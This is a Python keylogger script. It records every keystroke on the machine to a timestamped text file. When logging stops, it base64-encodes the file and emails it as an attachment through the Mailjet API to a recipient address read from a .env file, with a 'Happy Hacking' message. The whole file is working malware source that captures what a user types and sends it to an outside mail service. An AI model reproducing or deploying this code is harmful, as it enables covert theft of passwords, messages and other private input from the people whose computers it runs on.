# from pynput.keyboard import Listener
from dotenv import get_key
from mailjet_rest import Client
import base64
import os
from pynput import keyboard
import time
class Keylogger:
    def __init__(self):
        print("Keylogger initiated")
        self.filename = str(f"FILE-{str(time.strftime("%Y-%m-%d-%H-%M"))}.txt")
        with keyboard.Listener(on_press=self.on_press,on_release=self.on_release) as listener:
            listener.join()
            

    def on_press(self,key, injected):
        try:
            print('alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked'))
            with open(self.filename,'a') as f:
                f.write(key.char)
            f.close()
            
        except AttributeError:
            print('special key {} pressed'.format(
                key))

    def on_release(self,key, injected):
        try:
            print('{} released; it was {}'.format(
                key, 'faked' if injected else 'not faked'))
            if key == keyboard.Key.esc:
                # Stop listener
                return False
            elif key == keyboard.Key.enter:
                with open(self.filename,'a') as f:
                    f.write("\n")
                f.close()
                print("Enter is pressed")
            elif key == keyboard.Key.space:
                with open(self.filename,'a') as f:
                    f.write(" ")
                f.close()
        except AttributeError:
            with open(self.filename,'a') as f:
                    f.write("\n")
                    f.write(str(key))
            f.close()

if __name__ == '__main__':
    MAILJET_API_USERNAME_KEY = get_key(dotenv_path=".env",key_to_get="MAILJET_API_USERNAME_KEY")
    MAILJET_API_SECRET_KEY = get_key(dotenv_path=".env",key_to_get="MAILJET_API_SECRET_KEY")
    print(MAILJET_API_SECRET_KEY)
    print(MAILJET_API_USERNAME_KEY)
    keylogger = Keylogger()
    mailjetClient = Client(auth=(MAILJET_API_USERNAME_KEY,MAILJET_API_SECRET_KEY), version='v3.1')
    loginName = os.getlogin()
    with open(keylogger.filename,'rb') as file:
        b64content = base64.b64encode(file.read()).decode('utf-8')
        print(b64content)
    file.close()
    data = {
        "FromEmail": str(get_key("FROM")),
    "FromName": "Ali hassan",
    "Subject": f"Keylogger File - SENT AT : {str(time.strftime("%Y-%m-%d-%H-%M-%S"))}",
    "Text-part": f"This is the file containing the key strokes from the PC {loginName if loginName else "loginNotFound"}",
    "Html-part": '<h1>Happy Hacking, Agent Twilight!</h1>',
    "Recipients": [{"Email": str(get_key("RECIPIENT"))}],
    "Attachments": [
								{
										"ContentType": "text/plain",
										"Filename": keylogger.filename,
										"Base64Content": b64content
								}
						]
    }
    result = mailjetClient.send.create(data=data)
    print(result.status_code)
    print(result.json())
